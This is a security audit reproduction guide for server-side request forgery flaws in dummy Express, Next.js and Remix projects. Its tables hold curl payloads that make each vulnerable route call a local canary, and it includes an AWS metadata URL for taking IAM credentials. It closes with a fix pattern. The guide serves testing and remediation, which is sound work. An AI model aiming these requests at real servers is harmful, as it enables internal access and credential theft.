# Reproducing the SSRF findings (no AI, just curl)

**What SSRF is:** the server fetches a URL that the attacker controls, so the attacker can make *your server* call
things only it can reach (localhost, internal services, cloud metadata at `169.254.169.254`).

**Proof method:** `repro/canary.py` is a fake internal service on `127.0.0.1:9999` (HTTPS on `9998`) that logs every
request it receives. A canary hit means the vulnerable server made the request for us.

## Run it automatically (express app, 5 findings + 1 safe contrast)
```bash
bash repro/run_express.sh
```
Needs node + npm + python3 + openssl. Prints each response and the canary log.

## Express (`dummy-projects/express-vite-bff/server/index.js`), runs with `node server/index.js` (port 3001)
| line | curl | why it works |
|---|---|---|
| 13 | `curl 'localhost:3001/api/proxy?url=http://127.0.0.1:9999/secret'` | `axios.get(req.query.url)`: whole URL is attacker-chosen; response body is returned, so data is exfiltrated |
| 19 | `curl -XPOST localhost:3001/api/webhook-test -H 'content-type: application/json' -d '{"callbackUrl":"http://127.0.0.1:9999/hit"}'` | blind SSRF: only the status code comes back, but the internal request still happens (can hit state-changing internal endpoints) |
| 24 | `curl 'localhost:3001/api/avatar?u=http://127.0.0.1:9999/secret'` | `http.get(req.query.u)` piped to the response |
| 28 | `curl 'localhost:3001/api/fetch/http%3A%2F%2F127.0.0.1%3A9999%2Fsecret'` | path param is URL-encoded full URL passed to `got` |
| 35 | `curl localhost:3001/api/tenant-config -H 'x-tenant-host: 127.0.0.1:9998'` | header becomes the HOST of `https://${host}/config.json`; scheme is fixed (https) but the destination is not |

Safe contrast (line 41): `curl 'localhost:3001/api/safe-proxy?url=http://127.0.0.1:9999/x'` is rejected by `assertAllowedUrl` (https + allowlist), no canary hit.

## Next.js, Remix: documented, not auto-run
These dummies have no runnable scaffolding (no `next dev` entry etc.). In a real app started on port 3000 the same
idea applies; replace the target with the canary or an internal address.

| project / file:line | curl |
|---|---|
| next-app-router `app/api/proxy/route.ts:8` | `curl 'localhost:3000/api/proxy?url=http://127.0.0.1:9999/secret'` |
| next-app-router `app/api/webhook-test/route.ts:7` | `curl -XPOST localhost:3000/api/webhook-test -d '{"callbackUrl":"http://127.0.0.1:9999/hit"}'` |
| next-app-router `app/preview/page.tsx:10` | `curl 'localhost:3000/preview?url=http://127.0.0.1:9999/secret'` (server component; only the `<title>` is rendered) |
| next-app-router `app/actions.ts:6` | server action: submit the form with `endpoint=http://127.0.0.1:9999/hit` (easiest from the browser; action IDs are build-specific) |
| next-pages-router `pages/api/image.ts:6` | `curl 'localhost:3000/api/image?src=http://127.0.0.1:9999/secret'` |
| next-pages-router `pages/api/rss.ts:7` | `curl 'localhost:3000/api/rss?feed=http://127.0.0.1:9999/secret'` |
| next-pages-router `pages/profile.tsx:6` | `curl 'localhost:3000/profile?avatar=http://127.0.0.1:9999/secret'` (response is inlined as a base64 data URI) |
| next-pages-router `next.config.js:6` | `hostname: "**"` lets the image optimizer fetch any https host: `curl 'localhost:3000/_next/image?url=https%3A%2F%2Fany-host.example%2Fx.png&w=64&q=75'` |
| remix-app `routes/preview.tsx:7` | `curl 'localhost:3000/preview?u=http://127.0.0.1:9999/secret'` |
| remix-app `routes/webhook.tsx:7` | `curl -XPOST localhost:3000/webhook -d 'endpoint=http://127.0.0.1:9999/hit'` |
| remix-app `routes/tenants.$tenant.tsx:6` | `curl 'localhost:3000/tenants/127.0.0.1:9999%23'` (tenant becomes the host in `http://<tenant>.internal/...`; the `.internal` suffix limits you to hosts under it, so this is weaker but still lets an attacker pick any `*.internal` host) |

## Cloud metadata (explanation only, do not run against real infra)
On AWS EC2 an SSRF like finding 1 with `?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/` can
leak the instance's IAM credentials. This is why SSRF is rated high (CWE-918).

## Fix pattern
Use an allowlist guard such as `assertAllowedUrl` (https only, exact host match). A real guard must also block
private/loopback IPs after DNS resolution and re-check on redirects.
